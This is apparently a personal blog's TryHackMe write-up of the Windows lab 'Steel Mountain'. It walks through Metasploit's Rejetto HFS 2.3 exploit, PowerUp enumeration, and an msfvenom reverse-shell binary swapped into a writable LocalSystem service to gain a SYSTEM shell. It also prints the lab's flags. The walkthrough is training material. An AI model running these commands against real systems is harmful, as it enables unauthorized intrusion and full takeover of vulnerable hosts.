---
date : 4/8/2025
layout : post
title: Steel Mountain
subtitle: TryHackMe Writeup - Steel Mountain
description: A step-by-step guide to rooting the Steel Mountain machine on TryHackMe, inspired by Mr. Robot.
image: https://tryhackme-images.s3.amazonaws.com/room-icons/c9030a2b60bb7d1cf4fcb6e5032526d3.jpeg
optimized_image: https://tryhackme-images.s3.amazonaws.com/room-icons/c9030a2b60bb7d1cf4fcb6e5032526d3.jpeg
category: tryhackme
tags:
  - TryHackMe
  - Metasploit
  - Privilege Escalation
  - Web Exploitation
author: Mustafa Altayeb
date: 2025-08-08 23:38
paginate: true

---

# Steel Mountain - TryHackMe Writeup

[Steel Mountain](https://tryhackme.com/room/steelmountain) is a Mr. Robot-themed Windows machine on TryHackMe. This writeup covers gaining initial access using Metasploit, enumerating privilege escalation vectors with PowerShell, and exploiting a Windows misconfiguration to achieve Administrator access.

---

## Objectives
1. Gain initial access to the Windows machine using Metasploit.
2. Enumerate privilege escalation vectors using PowerShell.
3. Exploit a Windows misconfiguration to gain Administrator access.

---

## Reconnaissance

### Nmap Scan
Run an Nmap scan to identify open ports and services:
```bash
nmap -p- -sCV -T5 10.10.195.17
```

**Results**:
```js
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012
3389/tcp  open  ssl/ms-wbt-server
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152-49164/tcp open msrpc      Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012
```

**Key Findings**:
- **Port 80**: Hosts a Microsoft IIS web server.
- **Port 8080**: Runs HttpFileServer (HFS) 2.3, a known vulnerable service.
- **Ports 135, 139, 445**: Indicate a Windows environment with RPC and SMB services.
- **Port 3389**: RDP is enabled.
- **Port 5985**: WinRM is available.


### Web Enumeration
Visiting the web server on port 80 reveals:
![Bill Harper Image](/assets/TryHackMeRoomsImage/STEELMOUNTAIN/Billhrabar.png)

Visiting port 8080 shows the HttpFileServer (HFS) 2.3 interface:
![HFS Server Image](/assets/TryHackMeRoomsImage/STEELMOUNTAIN/server2.png)

**Additional Info**: The HFS version is confirmed as 2.3 via the official site: [Rejetto HFS](http://www.rejetto.com/hfs/).

---

## Initial Access with Metasploit

### Exploit Selection
Start Metasploit and search for exploits related to `rejetto` (HFS developer):
```js
msf6 > search rejetto
```
**Result**:
```js
   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
```

Select the exploit:
```js
msf6 > use exploit/windows/http/rejetto_hfs_exec
```

### Configure and Run
Set the target IP and port:
```js
msf6 > set RHOSTS 10.10.195.17
msf6 > set RPORT 8080
msf6 > run
```

**Output**:
```
[*] Started reverse TCP handler on 10.10.86.27:4444 
[*] Using URL: http://10.10.86.27:8080/RYjvc2zAZmYKC4
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /RYjvc2zAZmYKC4
[*] Sending stage (175686 bytes) to 10.10.128.249
[*] Meterpreter session 1 opened (10.10.86.27:4444 -> 10.10.128.249:49214) at 2025-08-08 12:56:20 +0000
[*] Server stopped.
meterpreter >
```

**Result**: A Meterpreter session is established, granting initial access as a low-privileged user (likely `bill`).

---

## Privilege Escalation

### Enumeration with PowerUp.ps1
To identify privilege escalation vectors, use the `PowerUp.ps1` script:
1. Download the script: [PowerUp.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1).
2. Save it locally as `PowerUp.ps1`.
3. Upload it to the target machine:
```js
meterpreter > upload /root/PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /root/PowerUp.ps1 -> PowerUp.ps1
```

4. Load PowerShell in Meterpreter:
```js
meterpreter > load powershell
meterpreter > powershell_shell
```

5. Run the script and execute `Invoke-AllChecks`:
```js
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks
```

**Relevant Output**:
```js
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : C:\Program Files (x86)\IObit\Advanced SystemCare
ModifiableFilePermissions : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName      : LocalSystem
AbuseFunction  : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart     : True
Check          : Modifiable Service Files
```

**Key Finding**: The `AdvancedSystemCareService9` service runs as `LocalSystem` and is modifiable by the `bill` user. It can be restarted, making it exploitable.

---

### Exploiting the Misconfiguration
1. **Generate a Reverse Shell**:
Create a malicious executable to replace the service binary:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.86.27 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```
**Output**:
```js
Payload size: 351 bytes
Final size of exe-service file: 15872 bytes
Saved as: Advanced.exe
```

2. **Upload the Malicious Binary**:
Navigate to the target directory and upload the reverse shell:
```js
meterpreter > cd "C:\Program Files (x86)\IObit\Advanced SystemCare"
meterpreter > upload /root/Advanced.exe
[*] Uploaded 15.50 KiB of 15.50 KiB (100.0%): /root/Advanced.exe -> Advanced.exe
```

3. **Set Up a Netcat Listener**:
Start a listener on the attacker's machine:
```js
nc -nlvp 4443
```

4. **Replace and Restart the Service**:
Access a Windows CMD shell:
```js
meterpreter > shell
C:\Program Files (x86)\IObit\Advanced SystemCare>
```

Stop and restart the service:
```js
sc stop AdvancedSystemCareService9
sc start AdvancedSystemCareService9
```

5. **Gain SYSTEM Shell**:
The Netcat listener receives a connection:
```js
nc -nlvp 4443
connect to [10.10.86.27] from (UNKNOWN) [10.10.128.249] 49298
Microsoft Windows [Version 6.3.9600]
C:\Windows\system32>
```

**Result**: A SYSTEM-level shell is obtained, granting Administrator access.

---

## Retrieving Flags

1. **User Flag**:
Navigate to the `bill` user’s desktop:
```js
C:\Users\bill\Desktop>more user.txt
b04763b6fcf51fcd7c13abc7db4fd365
```

2. **Root Flag**:
Navigate to the Administrator’s desktop:
```js
C:\Users\Administrator\Desktop>more root.txt
9af5f314f57607c00fd09803a587db80
```

---

## Summary
- **Initial Access**: Exploited a remote command execution vulnerability in HttpFileServer 2.3 (port 8080) using Metasploit’s `rejetto_hfs_exec` module.
- **Privilege Escalation**: Identified a misconfigured service (`AdvancedSystemCareService9`) using `PowerUp.ps1`. Replaced its binary with a malicious reverse shell and restarted the service to gain SYSTEM privileges.
- **Flags Captured**: Retrieved user and root flags from the respective desktops.

---

<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style='border:none;'></iframe>

Follow me through these links
---

